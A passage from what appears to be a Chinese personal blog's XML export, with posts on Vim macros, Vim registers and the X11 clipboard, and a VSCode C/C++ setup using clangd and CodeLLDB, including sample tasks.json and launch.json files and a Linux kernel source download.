<p><span class="exturl" data-url="aHR0cHM6Ly9nby5kZXYvYmxvZy9kZWNsYXJhdGlvbi1zeW50YXg=">Go’s declaration syntax<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9jLWZhcS5jb20vZGVjbC9zcGlyYWwuYW5kZXJzb24uaHRtbA==">The &#96;&#96;Clockwise&#x2F;Spiral Rule’’<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <tags>
        <tag>type</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim中的宏：自动化魔法</title>
    <url>/vim-macros/</url>
    <content><![CDATA[<p>清明节闲着没事写点Vim的东西。我对Vim有诸多怨念，不过Vim有几个地方我很喜欢，最重要的一个就是操作可以组合和自动化。</p>
<span id="more"></span>

<h2 id="宏的魔法世界"><a href="#宏的魔法世界" class="headerlink" title="宏的魔法世界"></a>宏的魔法世界</h2><p>宏可以完成很多自动化的操作，不过相比自动化，更迷人的是像写代码一样编辑文本。有一点元编程的画风，不过相比于模板元那种黑魔法，vim里的宏是人见人爱的白魔法。而且vim编辑文本的操作命令很简单，你要打印1000个 Hello, World!，不使用循环等高级功能，只需要将print这一行复制999次</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, World!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>用vim这很简单，只需要<code>yy1000p</code>这种组合命令就可以了。用别的编程语言生成这么1000行print都比把print直接放在循环里麻烦。</p>
<p>如果是很简单的重复操作，也不需要专门录制宏。比如：</p>
<p><code>.</code>	重复上一个edit命令<br><code>;</code> 重复上一个查找命令<br><code>&amp;</code> 替换下一个文本<br><code>@:</code> 命令重复上一个Editor Command，这个我不常用，我喜欢上箭头选上一个然后回车</p>
<p>但是如果想连续执行一段<code>;.</code>, 就需要用宏了（<code>11;.</code>的结果是先执行11次;再执行11次.）</p>
<p>如果要输出从1到1000，用vim的循环也可以完成</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">6</span>)</span><br><span class="line">:   <span class="keyword">call</span> <span class="built_in">setline</span>(i, i.<span class="string">&#x27; &#x27;</span>.<span class="built_in">getline</span>(i))</span><br><span class="line">:<span class="keyword">endfor</span></span><br></pre></td></tr></table></figure>

<p>如果用宏来操作是这样的，<code>Ctrl+a</code>和<code>Ctrl+x</code>分别是对数字自增和自减，我们可以将操作分解成复制粘贴自增，然后重复998次就可以了</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">第一行输入<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">qa</span> 开始宏录制</span><br><span class="line">yyp 复制并粘贴第一行</span><br><span class="line">C-<span class="keyword">a</span> 自增<span class="number">1</span></span><br><span class="line">q   结束宏录制</span><br><span class="line"><span class="number">998</span>@ 重复<span class="number">998</span>次，输出<span class="number">1</span>-<span class="number">1000</span></span><br></pre></td></tr></table></figure>

<h2 id="稍微正经点的用途的例子"><a href="#稍微正经点的用途的例子" class="headerlink" title="稍微正经点的用途的例子"></a>稍微正经点的用途的例子</h2><p>注释几行文本：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">qa</span>  开始宏录制</span><br><span class="line">I#  <span class="keyword">insert</span>模式行首加#</span><br><span class="line">Esc 退出<span class="keyword">insert</span></span><br><span class="line"><span class="keyword">j</span>   下一行</span><br><span class="line">q   完成宏录制</span><br><span class="line"><span class="number">7</span>@a 注释<span class="number">7</span>行</span><br></pre></td></tr></table></figure>

<p>同理，我们想要把开头序号<code>1.</code>都变成<code>1)</code>的样子</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">qa</span>  q开始录制，保存到<span class="keyword">a</span>寄存器中</span><br><span class="line"><span class="number">0</span><span class="keyword">f</span>. 跳转到开头并查找第一个.</span><br><span class="line"><span class="keyword">j</span>  跳转到下一行</span><br></pre></td></tr></table></figure>

<p>大多数时候这种情况正则更方便，但是有的时候一堆混乱的文本容易误伤，宏的操作加入了位置信息等操作比较容易控制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. X1..XX</span><br><span class="line">2. SN.1FN</span><br><span class="line">3. PIN.GF</span><br><span class="line">4. 12 3.</span><br></pre></td></tr></table></figure>

<h2 id="注"><a href="#注" class="headerlink" title="注"></a>注</h2><p>这里举例子用宏加注释什么的，其实有很多操作并不需要宏来完成，比如注释有插件。</p>
<h2 id="关于Vim的使用姿势"><a href="#关于Vim的使用姿势" class="headerlink" title="关于Vim的使用姿势"></a>关于Vim的使用姿势</h2><p>曾经几年前我对Vim实在说不上喜欢，当时我还在Windows上（Windows上的vim体验你也知道），经常要连到linux上改改东西的时候我日常使用nano（后来发现了micro）。如果只是将Vim当成一套键盘操作，那效率可能并不比IDE的快捷键+鼠标操作更好。（而且vim的hjkl的键位等操作，对很多人是极大的劝退）<br>Vim的键位用好了可以形成肌肉记忆将操作交给小脑解放大脑，而宏这些操作是要开动大脑的。<br>我觉得吸引玩家入坑vim就应该从录制宏等操作讲起，这些才是图形界面的点击操作不具备的优势。  </p>
<p>宏适合干的就是重复的动作，比较适合处理一些枯燥的工作。比如经典的某些大道至简的语言sublime多光标实现泛型这样的事情，我们可以写一个宏去完成它。（其实我个人还是喜欢多光标）</p>
<p><img src="/uploads/generic.gif" alt="Go Type Parameters in Sublime"></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tYWNwbGF5LmdpdGh1Yi5pby9wb3N0cy92aW0tYnUteHUteWFvLWR1by1ndWFuZy1iaWFvLWJpYW4tamktZ29uZy1uZW5nLw==">【译】Vim 不需要多光标编辑功能<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BzY2h0b2VmZmVsL3lvdS1kb24tdC1uZWVkLW1vcmUtdGhhbi1vbmUtY3Vyc29yLWluLXZpbS0yYzQ0MTE3ZDUxZGI=">You don’t need more than one cursor in vim<i class="fa fa-external-link-alt"></i></span>   </p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim的寄存器与复制粘贴</title>
    <url>/vim-registers-copy-and-paste/</url>
    <content><![CDATA[<p>清明节假期写点Vim相关的东西，说一下寄存器。在此之前我眼中的复制粘贴从未如此复杂，就像我从未</p>
<span id="more"></span>

<p>另一个比我想象中复杂和有用的是Vim的undotree，有点git那种branch的味道（装上gnudo插件就更像了）。</p>
<h2 id="Linux下的复制粘贴"><a href="#Linux下的复制粘贴" class="headerlink" title="Linux下的复制粘贴"></a>Linux下的复制粘贴</h2><p>首先说一下linux下面的复制粘贴，一般linux桌面的复制粘贴是<code>x11</code>负责的，复制粘贴的时候和<code>X Server</code>通信（一般管复制粘贴叫selections），有两个常见的selections：</p>
<p>PRIMARY：鼠标左键选中复制，鼠标中键粘贴<br>CLIPBOARD： <code>Ctrl + Shift + C</code>和<code>Ctrl + Shift + V</code></p>
<p>这两个保存的内容是不同的，而且当你复制粘贴的时候两个应用必须同时开着，x11本身不全局保存复制的内容，应用关了就没了。所以如果你想要只有一个全局的剪切板，你得装一个<code>clipboard manager</code>（大多数桌面都贴心的自带了，可惜某些suck的wm并没有这个东西，曾经搞得我好几次弄丢了复制的东西不知道怎么回事）</p>
<p>推荐鼠标操作的时候尝试适应鼠标中键的操作，这样只要一只手控制鼠标就行了，比一只手鼠标一只手<code>Ctrl+C Ctrl+V</code>节省了一只手。在x11下的terminal中复制东西我一般用<code>xclip</code>。</p>
<h2 id="如果你只是简简单单复制粘贴"><a href="#如果你只是简简单单复制粘贴" class="headerlink" title="如果你只是简简单单复制粘贴"></a>如果你只是简简单单复制粘贴</h2><p>如果你不得不用vim，那还是鼠标选中和的复制粘贴更适合你，进入insert模式粘贴即可。简单的命令可以在normal模式下使用y和p即可（yank和paste， c命令被change占了）。y和p两个命令和其他的命令组合，可以覆盖绝大多数的用途。  </p>
<h2 id="精细组合操作"><a href="#精细组合操作" class="headerlink" title="精细组合操作"></a>精细组合操作</h2><p>比如<code>yw</code>复制一个单词，<code>yy</code>复制一行，<code>y$</code>复制当前光标到结尾, <code>y^</code>复制当前光标到开头， 同理，<code>yG</code>复制当前行到结尾。<br>这些命令还可以和数字继续组合，比如<code>y3w</code>复制3个单词， <code>2yy</code>复制三个单词。<br>还可以用来复制配对的括号的内容， 比如<code>yi&#123;</code>复制大括号<code>&#123;</code>中的内容，<code>ya&#123;</code>连括号一起复制。    </p>
<h2 id="寄存器的进阶用法"><a href="#寄存器的进阶用法" class="headerlink" title="寄存器的进阶用法"></a>寄存器的进阶用法</h2><h3 id="多种多样的寄存器"><a href="#多种多样的寄存器" class="headerlink" title="多种多样的寄存器"></a>多种多样的寄存器</h3><p>使用<code>:reg</code>查看寄存器，Vim的寄存器可以让复制粘贴玩出更多的花样， 下面介绍这些寄存器。<br>Vim的0-9寄存器是普通的寄存器，y命令默认会放到0，然后每次y会把最新的放到0，0放到1，依次保存结果。 如果你想粘贴哪个寄存器的值，在insert模式下<code>Ctrl+R 寄存器</code>， 比如粘贴寄存器3：<code>Ctrl+R 3</code>。</p>
<p>比较有用的是4个只读寄存器和搜索寄存器：</p>
<p><code>.</code>  最近插入的文本<br><code>:</code>  最近执行的命令<br><code>%</code>  存放当前文件名（相对）<br><code>#</code>  交替文件（这个好像没啥用, 就是你在当前terminal打开的上一个文件的文件名）<br><code>/</code> 搜索寄存器，可以设置默认的搜索内容。比如<code>:let @/ = &quot;package main&quot;</code>, 下次搜索的时候只要输入<code>/</code>， 会自动查找<code>package main</code>这段文本</p>
<h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><p><code>xp</code> 交换两个单词，x将一个单词剪切到寄存器，p复制（利用错位交换）<br>（交换两个单词建议用abloish插件）  </p>
<p>如果你删了东西后悔了可以去小删除寄存器里面找</p>
<h3 id="Vim剪切板和x11的剪切板交互"><a href="#Vim剪切板和x11的剪切板交互" class="headerlink" title="Vim剪切板和x11的剪切板交互"></a>Vim剪切板和x11的剪切板交互</h3><p>在设置中<code>set clipboard^=unnamed,unnamedplus</code>，开启系统的剪切板，就会多出来两个寄存器<code>*</code>和<code>+</code>。一般<code>*</code>是PRIMARY，<code>+</code>是CLIPBOARD。（开系统剪切板功能你可能需要gvim或者neovim，vim这个包可能不支持）  </p>
<p>当然这么干会把匿名寄存器“”的值和系统的CLIPBOARD复制粘贴绑定，不过比起少打几个<code>+</code>， 可以接受。<br>（并没有绑定PRIMARY，<code>*p</code>会粘贴CLIPBOARD的内容，PRIMARY直接鼠标中键粘贴就可以了。所以复制同步的过程并不会在每次鼠标选中文本的时候发生，只有在手动<code>Ctrl+Shitf+C</code>的时候才有，可以接受）</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvQ2xpcGJvYXJk">https://wiki.archlinux.org/title/Clipboard<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cudW5pbmZvcm1hdGl2LmRlL2Jsb2cvcG9zdGluZ3MvMjAxNy0wNC0wMi8wL1BPU1RJTkctZW4uaHRtbA==">X11: How does “the” clipboard work?<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYnJpYW5zdG9ydGkuY29tL3ZpbS1yZWdpc3RlcnMv">Vim registers: The basics and beyond<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode C/C++ 开发环境和调试配置：Clangd+Codelldb</title>
    <url>/vscode-c-and-cpp-develop-and-debug-setting/</url>
    <content><![CDATA[<p>卸了cpptools和C++ Intelligence吧，来试试clangd或者ccls</p>
<span id="more"></span>

<h2 id="太长不看版"><a href="#太长不看版" class="headerlink" title="太长不看版"></a>太长不看版</h2><p>别用微软官方的那个C&#x2F;C++扩展（cpptools）和 C++ intelligence 扩展，用 clangd 和 CodeLLDB。<br><strong>全文完。我们下次再见</strong></p>
<h2 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置"></a>安装和配置</h2><p>寻找保姆级教程、习惯鼠标操作、想将VSCode打造成一个C&#x2F;C++ IDE的读者建议立刻退出并寻找其他教程。以下操作以Archlinux为例，如果你是Windos用户请去用尊贵的宇宙第一IDE Visual Studio 或者通过WSL和VSCode Remote获得一个linux的开发环境。以下假定读者有一定的基础和使用搜索引擎查资料的能力。<strong>这不是一个保姆级教程、详细教程</strong>。  </p>
<p>配置环境本应该是一件很简单的事情，然而M$的官方文档在推自己的cpptools塞私货，大量配置教程不是太啰嗦就是教你用cpptools，已经造成了信息污染。于是有了这篇clangd和Codelldb安利文。</p>
<p>事实上这是很简单的，你只需要干这些事：</p>
<h3 id="安装VSCode"><a href="#安装VSCode" class="headerlink" title="安装VSCode"></a>安装VSCode</h3><p>通常一条命令就可以了，已安装用户请略过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装code-oss版本，和插件市场</span></span><br><span class="line">yay -S code code-marketplace</span><br><span class="line"><span class="comment"># 如果你想装闭源的VSCode</span></span><br><span class="line">yay -S visual-studio-code-bin </span><br></pre></td></tr></table></figure>

<h3 id="安装编译器"><a href="#安装编译器" class="headerlink" title="安装编译器"></a>安装编译器</h3><p>想用gcc就用gcc，无特殊需求系统自带的gcc已经足矣（有特殊版本和交叉编译请自行安装对应版本）。想用clang就装clang。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S llvm lld lldb clang</span><br></pre></td></tr></table></figure>

<h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>点击安装就可以</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tYXJrZXRwbGFjZS52aXN1YWxzdHVkaW8uY29tL2l0ZW1zP2l0ZW1OYW1lPWxsdm0tdnMtY29kZS1leHRlbnNpb25zLnZzY29kZS1jbGFuZ2Q=">clangd插件<i class="fa fa-external-link-alt"></i></span>  用于高亮、自动补全、跳转<br><span class="exturl" data-url="aHR0cHM6Ly9tYXJrZXRwbGFjZS52aXN1YWxzdHVkaW8uY29tL2l0ZW1zP2l0ZW1OYW1lPXZhZGltY24udnNjb2RlLWxsZGI=">CodeLLDB插件<i class="fa fa-external-link-alt"></i></span>  如果你需要图形界面debug</p>
<p>ps: 如果你用闭源的VSCode，那就直接在M$的插件市场装。Code-OSS版本可以修改<code>product.json</code>使用插件市场。如果你使用或者VSCodium版本，请从OpenVSX安装<span class="exturl" data-url="aHR0cHM6Ly9vcGVuLXZzeC5vcmcvZXh0ZW5zaW9uL2xsdm0tdnMtY29kZS1leHRlbnNpb25zL3ZzY29kZS1jbGFuZ2Q=">clangd插件<i class="fa fa-external-link-alt"></i></span>（或者手动下载）</p>
<h3 id="安装clangd-LSP"><a href="#安装clangd-LSP" class="headerlink" title="安装clangd LSP"></a>安装clangd LSP</h3><p>然后按<code>F1</code>，选<code>clangd:Download Language Server</code>, 下载clangd LSP （如果你想用系统包管理器装clangd也可以, Archlinux在<code>llvm</code>这个包里，Debian等发行版有单独的<code>clangd</code>包）</p>
<h3 id="clangd插件主要功能和配置"><a href="#clangd插件主要功能和配置" class="headerlink" title="clangd插件主要功能和配置"></a>clangd插件主要功能和配置</h3><p>切换c&#x2F;cpp文件和<code>.h</code>头文件：Alt+O</p>
<p>clangd: Open Type Hierarchy 显示类的继承关系，我一般不怎么用类，除非写Qt。比较鸡肋的功能。</p>
<p>clangd-tidy系列检查工具：</p>
<h2 id="Debug和运行"><a href="#Debug和运行" class="headerlink" title="Debug和运行"></a>Debug和运行</h2><p>编译运行这个就没必要装插件了吧，单个文件我使用gcc&#x2F;g++命令或者clang&#x2F;clang++命令，编译并运行。一个项目那就写个Makefile或者cmake之类的东西呗。</p>
<p>比如一个简单的cmake：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.28</span>.<span class="number">1</span>)</span><br><span class="line"><span class="keyword">project</span> (Transformation)</span><br><span class="line"></span><br><span class="line"><span class="keyword">find_package</span>(Eigen3 REQUIRED)</span><br><span class="line"><span class="keyword">include_directories</span>(EIGEN3_INCLUDE_DIR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span> (Transformation main.cpp)</span><br></pre></td></tr></table></figure>

<p>如果vscode装了cmake插件可以F7执行build</p>
<h3 id="使用gdb和lldb命令Debug"><a href="#使用gdb和lldb命令Debug" class="headerlink" title="使用gdb和lldb命令Debug"></a>使用gdb和lldb命令Debug</h3><p>如果你需要Debug，在终端使用gdb和lldb即可， over～</p>
<h3 id="使用VSCode提供的图形界面Debugger"><a href="#使用VSCode提供的图形界面Debugger" class="headerlink" title="使用VSCode提供的图形界面Debugger"></a>使用VSCode提供的图形界面Debugger</h3><p>哦，你要图形界面啊，安装Codelldb插件。<code>Ctrl+Shift+D</code>点左边栏的debug按钮，然后应该会自动生成一个<code>launch.json</code>，然后自行配置你的debug命令、参数和环境变量，参考：<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9lZGl0b3IvZGVidWdnaW5n">VSCode Debugging<i class="fa fa-external-link-alt"></i></span></p>
<p><code>tasks.json</code>如下，我以c语言为例，设置输出到<code>build</code>文件夹下同名<code>.out</code>文件，有需要请自行修改。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Compile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;clang&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/build/$&#123;fileBasenameNoExtension&#125;.out&quot;</span><span class="punctuation">,</span> <span class="comment">// 输出到build文件夹下</span></span><br><span class="line">                <span class="string">&quot;-Wall&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-std=c11&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>launch.json</code>如下，注意<code>preLaunchTask</code>要先执行<code>task.json</code>的label为<code>Compile</code>的任务</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LLDB Debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;/build/$&#123;fileBasenameNoExtension&#125;.out&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Compile&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>好了，这样就可以了。如果是cmake项目，不需要tasks.json，大概要写成这样</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;command:cmake.launchTargetPath&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后按F5调试</p>
<h2 id="其他的配置"><a href="#其他的配置" class="headerlink" title="其他的配置"></a>其他的配置</h2><h3 id="调试时使用命令操作"><a href="#调试时使用命令操作" class="headerlink" title="调试时使用命令操作"></a>调试时使用命令操作</h3><p>按F5进行调试，此时按<code>Ctrl+Shift+Y</code>调出Debug Console REPL就可以用gdb&#x2F;lldb的命令进行调试了。这样就又回到了熟悉的gdb&#x2F;lldb的命令，就可以不需要鼠标点点点进行调试了，一些Codelldb不支持显示在图形界面的调试功能也可以用了。</p>
<h3 id="每次调试都多产生一个Debug-Console"><a href="#每次调试都多产生一个Debug-Console" class="headerlink" title="每次调试都多产生一个Debug Console"></a>每次调试都多产生一个Debug Console</h3><p>给<code>launch.json</code>加上</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//args的这个设置是为了防止每次Debug都会多弹出一个Debug Console</span></span><br><span class="line"><span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>   </span><br><span class="line">    <span class="string">&quot;&amp;&amp;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;exit&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<h2 id="随便说说"><a href="#随便说说" class="headerlink" title="随便说说"></a>随便说说</h2><h3 id="关于C-C-的LSP其他选择"><a href="#关于C-C-的LSP其他选择" class="headerlink" title="关于C&#x2F;C++的LSP其他选择"></a>关于C&#x2F;C++的LSP其他选择</h3><p>目前用的比较多的C&#x2F;C++的LSP是ccls和clangd，各有优劣。我的体验是ccls没有clangd的补全和错误提示那么舒服，就一直在用clangd，有兴趣可以试试ccls。<br><del>反正这两个都比cpptools好用就是了</del></p>
<h3 id="关于VSCode和插件"><a href="#关于VSCode和插件" class="headerlink" title="关于VSCode和插件"></a>关于VSCode和插件</h3><p>本来是不想写这个的。但是看到你们官方文档闭口不提clangd，网上各路教程也都在教大家用cpptools和C++ intelligence这两个插件，我蚌埠住了。昨天一个小学弟配vscode的c&#x2F;c++环境，折腾了一整天，然后跟我吐槽vscode又慢又卡，我心里暗叫不好，这不会是又用了cpptools和C++ intelligence这两个插件吧。我问小学弟为什么不用clangd，他表示官方文档也没说啊，他明明按照官方文档来的。好吧，这也不怪小学弟，连官方文档都在叫你用M$那两个又吃内存又难用的插件。Google能搜到的也都在让你装这个。甚至你从EXTENSOINS的搜索栏里面搜c或者c++，前两个插件就是这两个，至于clangd，已经排在无数个名字里有c&#x2F;c++插件的后面找不着了。</p>
<p><strong>我的操作逐渐转为快捷键和terminal，图形界面主要用来展示而不是用来点点点完成操作</strong>。我主要是将VSCode作为一个neovim&#x2F;gdb&#x2F;lldb的展示前端来用，<a href="https://zhangjk98.xyz/vscode-neovim-setting/">Neovim插件配置见上一篇博客</a>。目前用习惯了VSCode还真没动力换别的，几次试图切到纯Neovim最后又滚回了VSCode+Neovim插件。  </p>
<p>VSCode正在变得臃肿，而且打字延迟比Sublime和Neovim高。VSCode丝滑的感觉远不如Sublime Text，也不如高配电脑上的Jetbrains家的全家桶。我比较喜欢VSCode一个是LSP，一个是没有太多捆绑功能+丰富的插件生态和开箱即用。但是最近这两年总感觉它不再想好好做一个编辑器了，总想抢IDE的活，可能是风头压过atom和sublime之后也失去了方向。单纯作为一个文本编辑器，VSCode的打磨和细节体验和Vim、Sublime都有还有不小的差距，但是现在眼看着要向一个IDE的方向狂奔了。</p>
<p>VSCode的插件良莠不齐，而VSCode本体也逐渐和我想要的编辑器差距越来越大。但是毕竟用习惯了。现在很多网上的教程都是把VSCode配置成IDE，装了一大堆插件，最后又慢又卡。大多数复杂的功能学习所用的时间很有可能赶不上学会以后帮你节省的时间，尤其是点点点的图形界面，每次更新按钮换位置又要从头找起。就算学也学一点一些不怎么变的快捷键和Vim操作，那些在肌肉记忆可以一直用下去。</p>
<p>我觉得如果VSCode你要用的开心，<strong>不要当IDE用，就当一个编辑器用</strong>。要有一种又不是不能用的<strong>摆烂</strong>心态，不要刻意去配置。简单配置到<strong>能用就行</strong>。</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9vcGVuLXZzeC5vcmcv">https://open-vsx.org/<i class="fa fa-external-link-alt"></i></span> M$的VSCode插件市场的开源替代<br><span class="exturl" data-url="aHR0cHM6Ly9jbGFuZ2QubGx2bS5vcmcv">https://clangd.llvm.org<i class="fa fa-external-link-alt"></i></span> clangd项目</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9lZGl0b3IvZGVidWdnaW5n">https://code.visualstudio.com/docs/editor/debugging<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9pbnRyb3ZpZGVvcy9kZWJ1Z2dpbmc=">https://code.visualstudio.com/docs/introvideos/debugging<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="番外：linux源码阅读环境配置"><a href="#番外：linux源码阅读环境配置" class="headerlink" title="番外：linux源码阅读环境配置"></a>番外：linux源码阅读环境配置</h2><p>一般看这种源码几乎都是Vim下用gtags或者在vscode下用 gnu global 插件，不过clangd配置完成后有语义分析，体验更好一点（虽然clangd会对一些注释和宏报Warning）。  </p>
<p>看这种大项目的代码，首先不能卡，然后要有语法高亮和跳转。然后各种头文件和宏不要一堆飘红报错。我之前一直以为VSCode打开这种特别大的项目的表现不堪大任，后来发现只是插件的问题，clangd表现相当不错。 </p>
<p>下载kernel的源码，如果只是阅读的话推荐只下载当前版本的，不要下整个 git repo，vscode打开repo会比打开普通文件夹要吃内存。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.16.15.tar.xz</span><br><span class="line">tar xf linux-5.16.15.tar.xz</span><br><span class="line"><span class="built_in">cd</span> linux-5.16.15</span><br></pre></td></tr></table></figure>

